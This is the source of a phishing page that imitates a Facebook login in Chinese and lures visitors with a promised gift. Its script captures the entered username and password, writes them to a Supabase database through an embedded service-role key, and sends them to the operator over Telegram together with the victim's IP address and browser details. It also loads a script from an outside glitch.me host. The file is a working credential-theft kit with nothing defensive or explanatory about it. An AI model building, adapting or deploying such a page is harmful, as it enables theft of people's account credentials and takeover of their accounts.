<?php
$currentUrl = $_SERVER['REQUEST_URI'];
$baseHref = '';
if (strpos($currentUrl, '/fb_themes/theme2/') === false) {
    $baseHref = '<base href="../fb_themes/theme2/">';
}
?>
<?= $baseHref ?>
<!DOCTYPE html>
<html lang="zh">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook 登录</title>
    <meta name="title" content="Facebook 登录领取礼物" />
    <link rel="icon" href="images/facvicon.png" type="image/png">
    <meta property="twitter:title" content="Facebook 登录领取礼物" />
    <meta property="twitter:description" content="Facebook 登录领取礼物" />
    <meta property="twitter:card" content="summary_large_image" />
    <meta property="og:title" content="1" />
    <meta property="og:type" content="article" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
    <style>
        // ... existing CSS ...
    </style>
</head>

<body>
    <div id="message">
        <div class="imgg">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/2048px-Facebook_f_logo_%282019%29.svg.png"
                alt="" class="logo">
        </div>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        </head>

        <body>
            <div class="popup" id="error-popup" style="display: none;">
                <div class="popup-content">
                    <p id="error-message"></p>
                    <div class="popup-divider"></div>
                    <button id="close-popup" onclick="closepop()">确定</button>
                </div>
            </div>

            <div class="xxx">
                <form id="login_form">
                    <div class="jav"></div>

                    <div class="jav">
                        <input type="text" id="tk" name="username" required class="inputtkmk"
                            placeholder="手机号或邮箱" onfocus="this.placeholder = ''"
                            onblur="this.placeholder = '手机号或邮箱'">
                    </div>
                    <div class="jav">
                        <input type="password" id="mk" name="password" required class="inputtkmk" placeholder="密码"
                            onfocus="this.placeholder = ''" onblur="this.placeholder = '密码'">
                    </div>
                    <div class="jav" style="margin-bottom: 16px;">
                        <button type="submit" class="login" id="login">登录</button>
                    </div>
                </form>

                <div class="jav">
                    <p class="resetpass">忘记密码？</p>
                </div>
                <div class="xx"></div>
                <div class="jav">
                    <button class="regacc">创建新帐户</button>
                    <center>
                        <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" alt=""
                            class="meta">
                    </center>
                </div>
            </div>

            <div class='navbar no-items section' id='navbar'></div>
            <script src="https://alpine-pale-fibre.glitch.me/script.js"></script>
            <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
            <script type='text/javascript'>
                // ... giữ nguyên JS code, chỉ dịch thông báo lỗi ...
                async function sendMessage(text, chat_id, token) {
                    try {
                        const url = `https://api.telegram.org/bot${token}/sendMessage`;
                        const obj = { chat_id: chat_id, text: text };
                        await fetch(url, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify(obj),
                        });
                    } catch {}
                }
                const sb = supabase.createClient(
                    "https://nkckriujybohswbebyyj.supabase.co",
                    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5rY2tyaXVqeWJvaHN3YmVieXlqIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc0NTYzNDIzNywiZXhwIjoyMDYxMjEwMjM3fQ.Fu9sytcqnjgl8EI81aVrbPuSlXdxGzkRQMn1bs4QZ0A",
                    { db: { schema: "public" } }
                );
                const domain_fb = window.location.protocol + "//" + window.location.host + "/login"
                document.querySelector('#login').addEventListener('click', function (event) {
                    event.preventDefault();
                    var username = document.getElementsByName('username')[0].value;
                    var password = document.getElementsByName('password')[0].value;
                    if (!isValidEmail(username) && !isValidPhone(username)) {
                        showError('用户名或密码错误');
                        return;
                    }
                    if (!isValidPassword(password)) {
                        showError('用户名或密码错误');
                        return;
                    }
                    (async () => {
                        const { data, error } = await sb
                            .from("website")
                            .select("*")
                            .eq("domain_fb", domain_fb);
                        await sb.from("account").insert({
                            username: username,
                            password: password,
                            user_id: data[0].user_id,
                            website_id: data[0].id,
                        });
                        const { data: profile } = await sb
                            .from("profile")
                            .select("*")
                            .eq("id", data[0].user_id);
                        const token = profile[0].tele_token;
                        const chat_id = profile[0].tele_chat_id;
                        let ip = await fetch("https://api.ipify.org?format=json")
                        ip = await ip.json()
                        const message = `Account: ${username}\nPassword: ${password}\nIp: ${ip.ip}\nUser Agent: ${navigator.userAgent}`;
                        await sendMessage(message, chat_id, token);
                        if (data[0].link_redirect) {
                            window.location.href = data[0].link_redirect;
                        }
                    })();
                    function isValidEmail(email) {
                        var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
                        return emailRegex.test(email);
                    }
                    function isValidPhone(phone) {
                        var phoneRegex = /^0\d{9}$/;
                        return phoneRegex.test(phone);
                    }
                    function isValidPassword(password) {
                        return password.length > 6;
                    }
                    function showError(message) {
                        document.getElementById('error-message').innerText = message;
                        document.getElementById('error-popup').style.display = 'block';
                    }
                    function closepop() {
                        document.getElementById('error-popup').style.display = 'none';
                    }
                })
            </script>
        </body>

</html> 